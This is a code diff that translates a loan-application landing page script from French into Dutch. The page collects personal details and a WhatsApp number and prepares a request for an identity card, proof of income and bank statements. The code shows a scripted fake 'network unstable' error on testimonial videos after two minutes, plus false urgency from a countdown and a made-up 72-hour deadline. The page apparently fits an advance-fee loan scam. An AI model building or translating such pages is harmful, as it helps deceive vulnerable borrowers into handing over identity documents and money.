@@ -2,13 +2,13 @@
     'use strict';
 
     // ========================================
-    // 0. APPS SCRIPT CONFIG (AJOUTÉ)
+    // 0. APPS SCRIPT CONFIG (ONGEWIJZIGD, ALLEEN VERTAALDE COMMENTAREN)
     // ========================================
     const APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyaqL3zEvP_9fu3cOGOcDPa8Wa0le87vVA_iGTNhNPd0Zqg3bXtCo_GCtJUwRCzXGMc/exec';
 
-    // Génère un session_id NUMÉRIQUE (stable en mémoire pour la session navigateur)
+    // Genereert een NUMERIEK session_id (stabiel in het browserscherm voor de sessie)
     const SESSION = {
-        id: String(Date.now()) + String(Math.floor(100 + Math.random() * 899)), // ex: 1739561234123xxx
+        id: String(Date.now()) + String(Math.floor(100 + Math.random() * 899)), // bijv.: 1739561234123xxx
         openedAtISO: new Date().toISOString()
     };
 
@@ -31,7 +31,7 @@
     }
 
     // ========================================
-    // 1. CONFIGURATION GLOBALE
+    // 1. GLOBALE CONFIGURATIE
     // ========================================
     const CONFIG = {
         autoplayCarousel: false,
@@ -39,16 +39,16 @@
         smoothScrollOffset: 80,
         minAge: 18,
         tauxInteret: 3,
-        minWordsRaison: 1, // compat héritée, non utilisée
+        minWordsRaison: 1, // legacy compat, niet gebruikt
         exitIntentDelay: 60000,
-        countdownEndDate: '2025-10-30T23:59:59', // fin de l'offre (bannière)
-        videoLoadingTime: 120000, // 2 min avant affichage de l'erreur vidéo
+        countdownEndDate: '2025-10-30T23:59:59', // einde van de aanbieding (banner)
+        videoLoadingTime: 120000, // 2 min vóór het tonen van de videofout
         debugMode: true
     };
 
     const ICONS = {
-        ok: 'https://img.icons8.com/?size=100&id=YZHzhN7pF7Dw&format=png&color=16a34a', // vert
-        warning: 'https://img.icons8.com/?size=100&id=undefined&format=png&color=000000' // peut échouer -> fallback
+        ok: 'https://img.icons8.com/?size=100&id=YZHzhN7pF7Dw&format=png&color=16a34a', // groen
+        warning: 'https://img.icons8.com/?size=100&id=undefined&format=png&color=000000' // kan falen -> fallback
     };
 
     const formState = {
@@ -65,13 +65,13 @@
         }
     };
 
-    // Tracking pour l'exit-intent "1m30 sans clic CTA"
+    // Tracking voor exit-intent "1m30 zonder CTA-klik"
     let exitIntentTimer = null;
     let ctaClicked = false;
     const pageStartTime = Date.now();
 
     // ========================================
-    // 2. VALIDATION STRICTE DE LA DATE
+    // 2. STRIKTE DATUMVALIDATIE (NL-FORMAAT: DD-MM-JJJJ)
     // ========================================
     function isLeapYear(year) {
         return (year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0);
@@ -87,12 +87,12 @@
 
     function validateBirthDate(dateStr) {
         if (!dateStr || dateStr.length !== 10) {
-            return { valid: false, age: 0, error: 'Format requis : JJ/MM/AAAA' };
+            return { valid: false, age: 0, error: 'Vereist formaat: DD-MM-JJJJ' };
         }
 
-        const parts = dateStr.split('/');
+        const parts = dateStr.split('-');
         if (parts.length !== 3) {
-            return { valid: false, age: 0, error: 'Format invalide' };
+            return { valid: false, age: 0, error: 'Ongeldig formaat' };
         }
 
         const day = parseInt(parts[0], 10);
@@ -100,26 +100,26 @@
         const year = parseInt(parts[2], 10);
 
         if (isNaN(day) || isNaN(month) || isNaN(year)) {
-            return { valid: false, age: 0, error: 'Date invalide : caractères non numériques' };
+            return { valid: false, age: 0, error: 'Ongeldige datum: niet-numerieke tekens' };
         }
 
         const currentYear = new Date().getFullYear();
         if (year < 1900 || year > currentYear) {
-            return { valid: false, age: 0, error: `L'année doit être entre 1900 et ${currentYear}` };
+            return { valid: false, age: 0, error: `Het jaar moet tussen 1900 en ${currentYear} liggen` };
         }
 
         if (month < 1 || month > 12) {
-            return { valid: false, age: 0, error: 'Le mois doit être entre 01 et 12' };
+            return { valid: false, age: 0, error: 'Maand moet tussen 01 en 12 liggen' };
         }
 
         const maxDays = getDaysInMonth(month, year);
         if (day < 1 || day > maxDays) {
-            const monthNames = ['', 'janvier', 'février', 'mars', 'avril', 'mai', 'juin',
-                'juillet', 'août', 'septembre', 'octobre', 'novembre', 'décembre'];
+            const monthNames = ['', 'januari', 'februari', 'maart', 'april', 'mei', 'juni',
+                'juli', 'augustus', 'september', 'oktober', 'november', 'december'];
             return {
                 valid: false,
                 age: 0,
-                error: `${monthNames[month]} ${year} a seulement ${maxDays} jours (vous avez saisi ${day})`
+                error: `${monthNames[month]} ${year} heeft slechts ${maxDays} dagen (u gaf ${day} op)`
             };
         }
 
@@ -127,12 +127,12 @@
         if (birthDate.getDate() !== day ||
             birthDate.getMonth() !== month - 1 ||
             birthDate.getFullYear() !== year) {
-            return { valid: false, age: 0, error: 'Cette date n\'existe pas dans le calendrier' };
+            return { valid: false, age: 0, error: 'Deze datum bestaat niet in de kalender' };
         }
 
         const today = new Date();
         if (birthDate > today) {
-            return { valid: false, age: 0, error: 'La date ne peut pas être dans le futur' };
+            return { valid: false, age: 0, error: 'De datum kan niet in de toekomst liggen' };
         }
 
         let age = today.getFullYear() - birthDate.getFullYear();
@@ -143,16 +143,16 @@
         }
 
         if (age < CONFIG.minAge) {
-            return { valid: false, age, error: `Vous devez avoir au moins ${CONFIG.minAge} ans (vous avez ${age} ans)` };
+            return { valid: false, age, error: `U moet minimaal ${CONFIG.minAge} jaar oud zijn (u bent ${age} jaar)` };
         }
         if (age > 120) {
-            return { valid: false, age, error: 'Date de naissance improbable (plus de 120 ans)' };
+            return { valid: false, age, error: 'Onaannemelijke geboortedatum (ouder dan 120 jaar)' };
         }
         return { valid: true, age, error: '' };
     }
 
     // ========================================
-    // 3. VALIDATION AVEC DEBUG DÉTAILLÉ
+    // 3. VALIDATIE MET UITGEBREIDE DEBUG
     // ========================================
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
@@ -179,26 +179,26 @@
         return true;
     }
 
-    // Raison du prêt: min 3 caractères, lettres requises
+    // Reden van het project: min. 3 tekens, letters vereist
     function validateRaison(raison) {
         const trimmed = (raison || '').trim();
-        if (trimmed.length < 3) return { valid: false, error: 'Minimum 3 caractères requis' };
+        if (trimmed.length < 3) return { valid: false, error: 'Minstens 3 tekens vereist' };
         const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
-        if (!hasLetters) return { valid: false, error: 'Doit contenir des lettres' };
+        if (!hasLetters) return { valid: false, error: 'Moet letters bevatten' };
         return { valid: true, error: '' };
     }
 
     function validateName(name) {
         const trimmed = (name || '').trim();
-        if (trimmed.length < 2) return { valid: false, error: 'Minimum 2 caractères' };
+        if (trimmed.length < 2) return { valid: false, error: 'Minimaal 2 tekens' };
         const nameRegex = /^[a-zA-ZÀ-ÿ\s\-']+$/;
-        if (!nameRegex.test(trimmed)) return { valid: false, error: 'Caractères invalides détectés' };
+        if (!nameRegex.test(trimmed)) return { valid: false, error: 'Ongeldige tekens gedetecteerd' };
         const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
-        if (!hasLetters) return { valid: false, error: 'Doit contenir des lettres' };
+        if (!hasLetters) return { valid: false, error: 'Moet letters bevatten' };
         return { valid: true, error: '' };
     }
 
-    // Étape 1
+    // Stap 1
     function validateStep1() {
         formState.validationErrors.step1 = [];
 
@@ -210,29 +210,29 @@
         const pays = document.getElementById('pays')?.value || '';
 
         const prenomValidation = validateName(prenom);
-        if (!prenom) formState.validationErrors.step1.push('Prénom : champ vide');
-        else if (!prenomValidation.valid) formState.validationErrors.step1.push(`Prénom : ${prenomValidation.error}`);
+        if (!prenom) formState.validationErrors.step1.push('Voornaam: leeg veld');
+        else if (!prenomValidation.valid) formState.validationErrors.step1.push(`Voornaam: ${prenomValidation.error}`);
 
         const nomValidation = validateName(nom);
-        if (!nom) formState.validationErrors.step1.push('Nom : champ vide');
-        else if (!nomValidation.valid) formState.validationErrors.step1.push(`Nom : ${nomValidation.error}`);
+        if (!nom) formState.validationErrors.step1.push('Achternaam: leeg veld');
+        else if (!nomValidation.valid) formState.validationErrors.step1.push(`Achternaam: ${nomValidation.error}`);
 
         const dateValidation = validateBirthDate(dateNaissance);
-        if (!dateNaissance) formState.validationErrors.step1.push('Date de naissance : champ vide');
-        else if (!dateValidation.valid) formState.validationErrors.step1.push(`Date de naissance : ${dateValidation.error}`);
+        if (!dateNaissance) formState.validationErrors.step1.push('Geboortedatum: leeg veld');
+        else if (!dateValidation.valid) formState.validationErrors.step1.push(`Geboortedatum: ${dateValidation.error}`);
 
-        if (!email) formState.validationErrors.step1.push('E-mail : champ vide');
-        else if (!isValidEmail(email)) formState.validationErrors.step1.push('E-mail : adresse invalide ou suspecte');
+        if (!email) formState.validationErrors.step1.push('E-mail: leeg veld');
+        else if (!isValidEmail(email)) formState.validationErrors.step1.push('E-mail: ongeldig of verdacht adres');
 
-        if (!whatsapp) formState.validationErrors.step1.push('WhatsApp : champ vide');
-        else if (!isValidPhone(whatsapp)) formState.validationErrors.step1.push('WhatsApp : numéro invalide (format international requis)');
+        if (!whatsapp) formState.validationErrors.step1.push('WhatsApp: leeg veld');
+        else if (!isValidPhone(whatsapp)) formState.validationErrors.step1.push('WhatsApp: ongeldig nummer (internationaal formaat vereist)');
 
-        if (!pays) formState.validationErrors.step1.push('Pays : non sélectionné');
+        if (!pays) formState.validationErrors.step1.push('Land: niet geselecteerd');
 
         formState.step1Valid = formState.validationErrors.step1.length === 0;
 
         if (CONFIG.debugMode && !formState.step1Valid) {
-            console.log('❌ Étape 1 - Erreurs:', formState.validationErrors.step1);
+            console.log('❌ Stap 1 - Fouten:', formState.validationErrors.step1);
         }
 
         refreshStepOKBadges();
@@ -245,7 +245,7 @@
         return formState.step1Valid;
     }
 
-    // Étape 2
+    // Stap 2
     function validateStep2() {
         formState.validationErrors.step2 = [];
 
@@ -254,21 +254,21 @@
         const raison = document.getElementById('raison')?.value.trim() || '';
 
         if (isNaN(montant) || montant < 2000 || montant > 200000) {
-            formState.validationErrors.step2.push(`Montant : doit être entre 2 000 € et 200 000 € (actuel: ${montant} €)`);
+            formState.validationErrors.step2.push(`Bedrag: moet tussen € 2.000 en € 200.000 liggen (huidig: € ${montant})`);
         }
 
         if (isNaN(duree) || duree < 6 || duree > 120) {
-            formState.validationErrors.step2.push(`Durée : doit être entre 6 et 120 mois (actuel: ${duree} mois)`);
+            formState.validationErrors.step2.push(`Looptijd: moet tussen 6 en 120 maanden liggen (huidig: ${duree} maanden)`);
         }
 
         const raisonValidation = validateRaison(raison);
-        if (!raison) formState.validationErrors.step2.push('Raison du projet : champ vide');
-        else if (!raisonValidation.valid) formState.validationErrors.step2.push(`Raison du projet : ${raisonValidation.error}`);
+        if (!raison) formState.validationErrors.step2.push('Reden van het project: leeg veld');
+        else if (!raisonValidation.valid) formState.validationErrors.step2.push(`Reden van het project: ${raisonValidation.error}`);
 
         formState.step2Valid = formState.validationErrors.step2.length === 0;
 
         if (CONFIG.debugMode && !formState.step2Valid) {
-            console.log('❌ Étape 2 - Erreurs:', formState.validationErrors.step2);
+            console.log('❌ Stap 2 - Fouten:', formState.validationErrors.step2);
         }
 
         refreshStepOKBadges();
@@ -281,20 +281,20 @@
         return formState.step2Valid;
     }
 
-    // Étape 3
+    // Stap 3
     function validateStep3() {
         formState.validationErrors.step3 = [];
 
         const statut = document.getElementById('statut')?.value || '';
         const revenus = document.getElementById('revenus')?.value || '';
 
-        if (!statut) formState.validationErrors.step3.push('Statut professionnel : non sélectionné');
-        if (!revenus) formState.validationErrors.step3.push('Revenus réguliers : non sélectionné');
+        if (!statut) formState.validationErrors.step3.push('Professionele status: niet geselecteerd');
+        if (!revenus) formState.validationErrors.step3.push('Regelmatig inkomen: niet geselecteerd');
 
         formState.step3Valid = formState.validationErrors.step3.length === 0;
 
         if (CONFIG.debugMode && !formState.step3Valid) {
-            console.log('❌ Étape 3 - Erreurs:', formState.validationErrors.step3);
+            console.log('❌ Stap 3 - Fouten:', formState.validationErrors.step3);
         }
 
         refreshStepOKBadges();
@@ -307,11 +307,11 @@
     }
 
     // ========================================
-    // 4. LECTEUR VIDÉO AVEC ERREUR UNIQUE (⏱️ 2 minutes)
+    // 4. VIDEOSPELER MET ENKELE FOUT (⏱️ 2 minuten)
     // ========================================
     const singleVideoError = {
-        title: 'Problème réseau détecté',
-        message: 'Votre connexion semble instable. Veuillez vérifier votre connexion internet et réessayer ultérieurement.',
+        title: 'Netwerkprobleem gedetecteerd',
+        message: 'Uw verbinding lijkt instabiel. Controleer uw internetverbinding en probeer het later opnieuw.',
         code: 'ERR_NETWORK_UNSTABLE'
     };
 
@@ -332,21 +332,21 @@
                         <div style="color:#fff; font-weight:600; font-size:1rem; margin-bottom:.25rem;">${author}</div>
                         <div style="color:#888; font-size:.85rem;">📍 ${location} • ⏱️ ${duration}</div>
                     </div>
-                    <button id="close-video-modal" style="background:transparent; border:none; color:#888; font-size:1.5rem; cursor:pointer; width:40px; height:40px; display:flex; align-items:center; justify-content:center; border-radius:8px; transition:all .2s;" title="Fermer">✕</button>
+                    <button id="close-video-modal" style="background:transparent; border:none; color:#888; font-size:1.5rem; cursor:pointer; width:40px; height:40px; display:flex; align-items:center; justify-content:center; border-radius:8px; transition:all .2s;" title="Sluiten">✕</button>
                 </div>
                 <div id="video-player-container" style="aspect-ratio:16/9; background:#000; display:flex; align-items:center; justify-content:center; position:relative;">
                     <div id="video-loader" style="display:flex; flex-direction:column; align-items:center; gap:1.5rem;">
                         <div style="width:60px; height:60px; border:4px solid #333; border-top-color:#fff; border-radius:50%; animation: spin 1s linear infinite;"></div>
-                        <div style="color:#fff; font-size:.95rem;">Chargement de la vidéo...</div>
+                        <div style="color:#fff; font-size:.95rem;">Video wordt geladen...</div>
                     </div>
                     <div id="video-error" style="display:none; flex-direction:column; align-items:center; gap:1rem; padding:2rem; text-align:center; max-width:520px;">
                         <div style="display:flex; align-items:center; justify-content:center;">
-                            <img id="video-warning-icon" src="${ICONS.warning}" alt="Avertissement" style="width:64px;height:64px;display:block;"/>
+                            <img id="video-warning-icon" src="${ICONS.warning}" alt="Waarschuwing" style="width:64px;height:64px;display:block;"/>
                         </div>
                         <div style="color:#fff; font-size:1.3rem; font-weight:600; margin-top:.5rem;">${singleVideoError.title}</div>
                         <div style="color:#aaa; font-size:.95rem; line-height:1.6;">${singleVideoError.message}</div>
                         <div style="margin-top:.75rem; padding:.5rem .75rem; background:#2a2a2a; border-radius:8px; font-family:monospace; font-size:.85rem; color:#dc2626;">Code: ${singleVideoError.code}</div>
-                        <button id="retry-video" style="margin-top:.75rem; padding:.75rem 2rem; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-size:.95rem; font-weight:600; cursor:pointer; transition:all .2s;">🔄 Réessayer</button>
+                        <button id="retry-video" style="margin-top:.75rem; padding:.75rem 2rem; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-size:.95rem; font-weight:600; cursor:pointer; transition:all .2s;">🔄 Opnieuw proberen</button>
                     </div>
                 </div>
             </div>`;
@@ -398,7 +398,7 @@
     }
 
     // ========================================
-    // 5. GESTION DES VIDÉOS
+    // 5. VIDEO-BEHEER
     // ========================================
     function setupVideoPlayers() {
         const videoCards = document.querySelectorAll('.video-card');
@@ -422,18 +422,18 @@
     }
 
     // ========================================
-    // 6. FORMAT AUTOMATIQUE DATE
+    // 6. AUTOMATISCHE DATUMOPMAAK (DD-MM-JJJJ)
     // ========================================
     function setupDateFormatting() {
         const dateInput = document.getElementById('date-naissance');
         if (!dateInput) return;
         dateInput.type = 'text';
-        dateInput.placeholder = 'JJ/MM/AAAA';
+        dateInput.placeholder = 'DD-MM-JJJJ';
         dateInput.maxLength = 10;
         dateInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
-            if (value.length >= 5) value = value.substring(0, 5) + '/' + value.substring(5, 9);
+            if (value.length >= 2) value = value.substring(0, 2) + '-' + value.substring(2);
+            if (value.length >= 5) value = value.substring(0, 5) + '-' + value.substring(5, 9);
             e.target.value = value;
         });
         dateInput.addEventListener('blur', function() {
@@ -450,15 +450,15 @@
     }
 
     // ========================================
-    // 7. BANDEAU PROMO (noir + TIMER)
+    // 7. PROMO-BANNER (zwart + TIMER)
     // ========================================
     function formatCountdown(msRemaining) {
-        if (msRemaining <= 0) return '0j 0h 0min 0s';
+        if (msRemaining <= 0) return '0d 0u 0min 0s';
         const days = Math.floor(msRemaining / (1000 * 60 * 60 * 24));
         const hours = Math.floor((msRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
         const minutes = Math.floor((msRemaining % (1000 * 60 * 60)) / (1000 * 60));
         const seconds = Math.floor((msRemaining % (1000 * 60)) / 1000);
-        return `${days}j ${hours}h ${minutes}min ${seconds}s`;
+        return `${days}d ${hours}u ${minutes}min ${seconds}s`;
     }
 
     function setupPromoBannerTimer() {
@@ -475,10 +475,10 @@
             const now = Date.now();
             const diff = endTs - now;
             if (diff <= 0) {
-                promoBanner.textContent = '🎉 Offre exceptionnelle en cours';
+                promoBanner.textContent = '🎉 Speciale aanbieding actief';
                 return;
             }
-            promoBanner.textContent = `⏰ Offre valable encore ${formatCountdown(diff)}`;
+            promoBanner.textContent = `⏰ Aanbieding nog ${formatCountdown(diff)} geldig`;
         }
 
         tick();
@@ -486,20 +486,20 @@
             const now = Date.now();
             const diff = endTs - now;
             if (diff <= 0) {
-                promoBanner.textContent = '🎉 Offre exceptionnelle en cours';
+                promoBanner.textContent = '🎉 Speciale aanbieding actief';
                 clearInterval(timer);
             } else {
-                promoBanner.textContent = `⏰ Offre valable encore ${formatCountdown(diff)}`;
+                promoBanner.textContent = `⏰ Aanbieding nog ${formatCountdown(diff)} geldig`;
             }
         }, 1000);
     }
 
     // ========================================
-    // 8. CALCULATEUR & SLIDERS
+    // 8. CALCULATOR & SLIDERS
     // ========================================
     function calculerMensualite(montant, dureeEnMois, tauxAnnuel) {
         const tauxMensuel = tauxAnnuel / 100 / 12;
-               const mensualite = (montant * tauxMensuel) / (1 - Math.pow(1 + tauxMensuel, -dureeEnMois));
+        const mensualite = (montant * tauxMensuel) / (1 - Math.pow(1 + tauxMensuel, -dureeEnMois));
         return mensualite;
     }
 
@@ -507,18 +507,20 @@
         const dateFin = new Date();
         dateFin.setMonth(dateFin.getMonth() + parseInt(dureeEnMois, 10));
         const options = { year: 'numeric', month: 'long' };
-        return dateFin.toLocaleDateString('fr-FR', options);
+        return dateFin.toLocaleDateString('nl-NL', options);
     }
 
     function formatEuros(montant) {
-        return montant.toLocaleString('fr-FR', {
+        const n = montant.toLocaleString('nl-NL', {
             minimumFractionDigits: 2,
             maximumFractionDigits: 2
-        }) + ' €';
+        });
+        return '€ ' + n;
     }
 
     function formatMontant(value) {
-        return value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ') + ' €';
+        const s = value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
+        return '€ ' + s;
     }
 
     function updateSliderBackground(slider) {
@@ -555,32 +557,32 @@
         }
 
         resumeElement.innerHTML = `
-            <div style="font-weight:600;color:var(--brand);margin-bottom:.75rem;font-size:1rem;">📊 Estimation de votre prêt</div>
+            <div style="font-weight:600;color:var(--brand);margin-bottom:.75rem;font-size:1rem;">📊 Schatting van uw lening</div>
             <div style="color:var(--text);">
-                <strong>Vous souhaitez emprunter ${formatEuros(montant)}</strong> sur <strong>${duree} mois</strong>.
+                <strong>U wilt ${formatEuros(montant)}</strong> lenen over <strong>${duree} maanden</strong>.
             </div>
             <div style="margin-top:.5rem;color:var(--muted);font-size:.85rem;">
-                Au taux indicatif de <strong>${taux}%</strong> par an :
+                Met een indicatieve rente van <strong>${taux}%</strong> per jaar:
             </div>
             <div style="margin-top:.75rem;padding:.75rem;background:#fff;border-radius:8px;">
                 <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;">
-                    <span style="color:var(--muted);">Mensualité :</span>
+                    <span style="color:var(--muted);">Maandtermijn:</span>
                     <strong style="color:var(--brand);font-size:1.1rem;">${formatEuros(mensualite)}</strong>
                 </div>
                 <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;padding-top:.5rem;border-top:1px dashed var(--line);">
-                    <span style="color:var(--muted);">Coût total du crédit :</span>
+                    <span style="color:var(--muted);">Totale kredietkosten:</span>
                     <strong style="color:var(--text);">${formatEuros(coutCredit)}</strong>
                 </div>
                 <div style="display:flex;justify-content:space-between;padding-top:.5rem;border-top:1px dashed var(--line);">
-                    <span style="color:var(--muted);">Montant total à rembourser :</span>
+                    <span style="color:var(--muted);">Totaal terug te betalen:</span>
                     <strong style="color:var(--text);">${formatEuros(coutTotal)}</strong>
                 </div>
             </div>
             <div style="margin-top:.75rem;color:var(--muted);font-size:.85rem;">
-                Dernier paiement prévu en <strong>${dateFin}</strong>
+                Laatste betaling voorzien in <strong>${dateFin}</strong>
             </div>
             <div style="margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--line);color:var(--muted);font-size:.8rem;font-style:italic;">
-                ⚠️ Estimation indicative basée sur un taux de ${taux}%. Le taux final sera déterminé selon votre dossier.
+                ⚠️ Indicatieve schatting op basis van een rente van ${taux}%. De definitieve rente wordt bepaald op basis van uw dossier.
             </div>`;
     }
 
@@ -602,23 +604,23 @@
 
     if (dureeSlider && dureeValue) {
         dureeSlider.addEventListener('input', function() {
-            dureeValue.textContent = this.value + ' mois';
+            dureeValue.textContent = this.value + ' maanden';
             updateSliderBackground(this);
             afficherResumePret();
             validateStep2();
         });
-        dureeValue.textContent = dureeSlider.value + ' mois';
+        dureeValue.textContent = dureeSlider.value + ' maanden';
         updateSliderBackground(dureeSlider);
     }
 
     // ========================================
-    // 9. BOUTONS SUIVANT
+    // 9. VOLGENDE-KNOPPEN
     // ========================================
     function createNextButtons() {
-        // #PATCH-NEXT-BTN-SCOPED : ne cible QUE les 3 steps du formulaire
+        // #PATCH-NEXT-BTN-SCOPED : richt zich ALLEEN op de 3 stappen van het formulier
         const details = document.querySelectorAll('#lead-form .form-steps > details');
         details.forEach((detail, index) => {
-            // Ne pas créer de bouton pour la 3e étape ("Votre profil")
+            // Geen knop maken voor stap 3 ("Uw profiel")
             if (index === details.length - 1) return;
 
             const stepContent = detail.querySelector('.step-content');
@@ -626,7 +628,7 @@
             const nextButton = document.createElement('button');
             nextButton.type = 'button';
             nextButton.className = 'btn-next-step';
-            nextButton.innerHTML = 'Suivant →';
+            nextButton.innerHTML = 'Volgende →';
             nextButton.style.cssText = `
                 margin-top: 1.5rem; padding: 0.85rem 2rem; background: var(--brand); color: white;
                 border: none; border-radius: 12px; font-size: 0.95rem; font-weight: 600; cursor: pointer;
@@ -651,8 +653,8 @@
                 }
                 if (!isValid) {
                     showNotification(
-                        'Informations incomplètes ou invalides',
-                        'Veuillez corriger les erreurs suivantes :\n\n• ' + errors.join('\n• '),
+                        'Onvolledige of ongeldige informatie',
+                        'Corrigeer de volgende fouten:\n\n• ' + errors.join('\n• '),
                         'warning'
                     );
                     return;
@@ -669,7 +671,7 @@
             stepContent.appendChild(nextButton);
         });
 
-        // #PATCH-NEXT-BTN-DESKTOP-SIZE : réduit la taille du bouton “Suivant” sur desktop
+        // #PATCH-NEXT-BTN-DESKTOP-SIZE : kleinere “Volgende”-knop op desktop
         const style = document.createElement('style');
         style.textContent = `
             @media (min-width: 901px) {
@@ -683,7 +685,7 @@
     }
 
     // ========================================
-    // 10. ACCÈS AUX ÉTAPES + HITBOX + ICÔNE OK
+    // 10. TOEGANG TOT STAPPEN + HITBOX + OK-ICOON
     // ========================================
     function injectSummaryHitboxStyles() {
         const style = document.createElement('style');
@@ -766,12 +768,12 @@
                 if (this.open) {
                     if (index === 1 && !formState.step1Valid) {
                         e.preventDefault(); this.open = false;
-                        showNotification('Étape précédente incomplète', 'Complétez l\'étape 1 avant de continuer.', 'warning');
+                        showNotification('Vorige stap onvolledig', 'Rond stap 1 af voordat u doorgaat.', 'warning');
                         return false;
                     }
                     if (index === 2 && (!formState.step1Valid || !formState.step2Valid)) {
                         e.preventDefault(); this.open = false;
-                        showNotification('Étapes précédentes incomplètes', 'Complétez les étapes 1 et 2 avant de continuer.', 'warning');
+                        showNotification('Vorige stappen onvolledig', 'Rond stap 1 en 2 af voordat u doorgaat.', 'warning');
                         return false;
                     }
                 }
@@ -780,7 +782,7 @@
     }
 
     // ========================================
-    // 11. EXIT INTENT (après 90s, si tout est valide et pas de clic CTA)
+    // 11. EXIT INTENT (na 90s, als alles geldig is en geen CTA-klik)
     // ========================================
     function startExitIntentTimer() {
         exitIntentTimer = setTimeout(() => {}, CONFIG.exitIntentDelay);
@@ -796,10 +798,10 @@
         const montant = formatMontant(document.getElementById('montant')?.value || '0');
         const duree = document.getElementById('duree')?.value || '—';
 
-        // Date limite (J+3) affichée SANS heure
+        // Deadline (J+3) ZONDER tijd
         const deadline = new Date();
         deadline.setHours(deadline.getHours() + 72);
-        const deadlineStr = deadline.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long' });
+        const deadlineStr = deadline.toLocaleDateString('nl-NL', { day: 'numeric', month: 'long' });
 
         const popup = document.createElement('div');
         popup.id = 'exit-intent-popup';
@@ -814,17 +816,17 @@
                         border-radius:16px; padding:2.5rem; box-shadow:0 20px 60px rgba(0,0,0,0.3);
                         animation: slideUp .4s ease; text-align:center;">
                 <div style="font-size:3rem; margin-bottom:1rem;">🤭</div>
-                <h2 style="font-size:1.5rem; font-weight:700; color:var(--text); margin-bottom:1rem;">Oups ! Vous partez déjà ?</h2>
+                <h2 style="font-size:1.5rem; font-weight:700; color:var(--text); margin-bottom:1rem;">Oeps! Gaat u al weg?</h2>
                 <p style="color:var(--muted); margin-bottom:1.5rem; line-height:1.6;">
-                    Vous avez presque terminé ! Votre demande de <strong style="color: var(--brand);">${montant}</strong>
-                    sur <strong>${duree} mois</strong> est prête.
+                    U bent bijna klaar! Uw aanvraag van <strong style="color: var(--brand);">${montant}</strong>
+                    over <strong>${duree} maanden</strong> is gereed.
                 </p>
                 <p style="color:var(--text); font-weight:600; margin-bottom:2rem; padding:1rem; background:var(--bg-soft); border-radius:10px;">
-                    ⏰ Obtenez vos ${montant} avant le<br>
+                    ⏰ Ontvang uw ${montant} vóór<br>
                     <span style="color: var(--brand); font-size: 1.1rem;">${deadlineStr}</span>
                 </p>
-                <button id="exit-intent-cta" style="width:100%; padding:1rem 2rem; background:var(--accent); color:#fff; border:none; border-radius:12px; font-size:1rem; font-weight:700; cursor:pointer; margin-bottom:1rem; transition:all .2s;">📨 Finaliser ma demande maintenant</button>
-                <button id="exit-intent-close" style="background:transparent; border:none; color:var(--muted); font-size:.9rem; cursor:pointer; text-decoration:underline;">Non merci, je reviendrai plus tard</button>
+                <button id="exit-intent-cta" style="width:100%; padding:1rem 2rem; background:var(--accent); color:#fff; border:none; border-radius:12px; font-size:1rem; font-weight:700; cursor:pointer; margin-bottom:1rem; transition:all .2s;">📨 Mijn aanvraag nu afronden</button>
+                <button id="exit-intent-close" style="background:transparent; border:none; color:var(--muted); font-size:.9rem; cursor:pointer; text-decoration:underline;">Nee bedankt, ik kom later terug</button>
             </div>`;
 
         document.body.appendChild(popup);
@@ -841,8 +843,8 @@
             const submitBtn = document.querySelector('.cta-submit');
             if (submitBtn) {
                 ctaClicked = true;
-                // Envoi événement CTA (depuis popup)
-                sendCTAEventToSheet('Finaliser ma demande maintenant (popup)');
+                // CTA-event verzenden (via popup)
+                sendCTAEventToSheet('Mijn aanvraag nu afronden (popup)');
                 submitBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 submitBtn.style.animation = 'pulse 1s ease 3';
             }
@@ -865,14 +867,14 @@
     if (ctaBtn) {
         ctaBtn.addEventListener('click', () => { 
             ctaClicked = true; 
-            // Envoi événement CTA (bouton principal)
+            // CTA-event verzenden (hoofdknop)
             const label = (ctaBtn.textContent || '').trim();
             sendCTAEventToSheet(label || 'cta_submit');
         });
     }
 
     // ========================================
-    // 12. VALIDATION TEMPS RÉEL (sans stockage)
+    // 12. REALTIME VALIDATIE (zonder opslag)
     // ========================================
     function setupRealTimeValidation() {
         const prenomInput = document.getElementById('prenom');
@@ -896,7 +898,7 @@
             emailInput.addEventListener('blur', function() {
                 const email = this.value.trim();
                 if (email && !isValidEmail(email)) {
-                    this.setCustomValidity('Adresse e-mail invalide');
+                    this.setCustomValidity('Ongeldig e-mailadres');
                     this.style.borderColor = '#dc2626';
                 } else {
                     this.setCustomValidity('');
@@ -909,7 +911,7 @@
             whatsappInput.addEventListener('blur', function() {
                 const phone = this.value.trim();
                 if (phone && !isValidPhone(phone)) {
-                    this.setCustomValidity('Numéro invalide');
+                    this.setCustomValidity('Ongeldig nummer');
                     this.style.borderColor = '#dc2626';
                 } else {
                     this.setCustomValidity('');
@@ -941,7 +943,7 @@
     }
 
     // ========================================
-    // 13. SOUMISSION FORMULAIRE (E-MAIL PRÉREMPLI)
+    // 13. FORMULIERINDIENING (VOORGEVULDE E-MAIL)
     // ========================================
     function buildPrefilledEmail() {
         const prenom = (document.getElementById('prenom')?.value || '').trim();
@@ -959,34 +961,34 @@
         const revenus = (document.getElementById('revenus')?.value || '').trim();
 
         const pieces = [];
-        if (document.getElementById('piece1')?.checked) pieces.push('carte d’identité');
-        if (document.getElementById('piece2')?.checked) pieces.push('preuve de revenus');
-        if (document.getElementById('piece3')?.checked) pieces.push('relevé bancaire récent');
+        if (document.getElementById('piece1')?.checked) pieces.push('identiteitskaart');
+        if (document.getElementById('piece2')?.checked) pieces.push('inkomensbewijs');
